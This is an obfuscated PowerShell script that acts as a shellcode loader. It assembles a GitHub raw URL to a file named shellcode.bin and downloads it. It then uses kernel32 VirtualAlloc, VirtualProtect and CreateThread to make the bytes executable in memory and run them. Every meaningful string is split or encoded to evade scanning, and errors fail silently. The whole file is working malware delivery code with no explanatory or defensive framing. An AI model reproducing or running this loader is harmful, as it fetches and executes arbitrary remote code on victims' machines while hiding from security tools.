${_} = -join('h','t','t','p','s',':','/','/','g','i','t','h','u','b','.','c','o','m','/','M','J','0','6','-','B','P','/','b','p','/','r','a','w','/','r','e','f','s','/','h','e','a','d','s','/','m','a','i','n','/','s','h','e','l','l','c','o','d','e','.','b','i','n')

try {
    ${w} = New-Object ("N"+"e"+"t"+"."+"W"+"e"+"b"+"C"+"l"+"i"+"e"+"n"+"t")
    ${s} = ${w}.("$($('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'D'+'a'+'t'+'a'))")(${_})
} catch { exit }

${z} = ${s}.Length

Add-Type -MemberDefinition (
    "[$('D'+'l'+'l'+'I'+'m'+'p'+'o'+'r'+'t')(`"$(
        -join('k','e','r','n','e','l','3','2')
    )`)] public static extern $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) $( -join('V','i','r','t','u','a','l','A','l','l','o','c') ) ( $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) a, uint b, uint c, uint d );" + 
    "[$('D'+'l'+'l'+'I'+'m'+'p'+'o'+'r'+'t')(`"$(
        -join('k','e','r','n','e','l','3','2')
    )`)] public static extern bool $( -join('V','i','r','t','u','a','l','P','r','o','t','e','c','t') ) ( $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) a, uint b, uint c, out uint d );" + 
    "[$('D'+'l'+'l'+'I'+'m'+'p'+'o'+'r'+'t')(`"$(
        -join('k','e','r','n','e','l','3','2')
    )`)] public static extern $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) $( -join('C','r','e','a','t','e','T','h','r','e','a','d') ) ( $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) a, uint b, $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) c, $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) d, uint e, out uint f );" + 
    "[$('D'+'l'+'l'+'I'+'m'+'p'+'o'+'r'+'t')(`"$(
        -join('k','e','r','n','e','l','3','2')
    )`)] public static extern uint $( -join('W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t') ) ( $([char]73+$([char]110+$([char]116+$([char]80+$([char]116+$([char]114)))))))) h, uint m );"
) -Name $('W'+'i'+'n'+'3'+'2') -Namespace $('N'+'a'+'t'+'i'+'v'+'e') -PassThru | Out-Null

try {
    ${m} = [Native.Win32]::$( -join('V','i','r','t','u','a','l','A','l','l','o','c') )(
        [IntPtr]::Zero, 
        [uint32]${z}, 
        0x3000, 
        0x04
    )

    if (${m} -eq [IntPtr]::Zero) { exit }

    [Runtime.InteropServices.Marshal]::("$($('C'+'o'+'p'+'y'))")(${s}, 0, ${m}, ${z})

    ${o} = 0
    [Native.Win32]::$( -join('V','i','r','t','u','a','l','P','r','o','t','e','c','t') )(
        ${m}, 
        [uint32]${z}, 
        0x20, 
        [ref]${o}
    ) | Out-Null

    ${t} = 0
    ${h} = [Native.Win32]::$( -join('C','r','e','a','t','e','T','h','r','e','a','d') )(
        [IntPtr]::Zero, 
        0, 
        ${m}, 
        [IntPtr]::Zero, 
        0, 
        [ref]${t}
    )

    if (${h} -eq [IntPtr]::Zero) { exit }

    [Native.Win32]::$( -join('W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t') )(
        ${h}, 
        [uint32]::MaxValue
    ) | Out-Null
}
catch { }
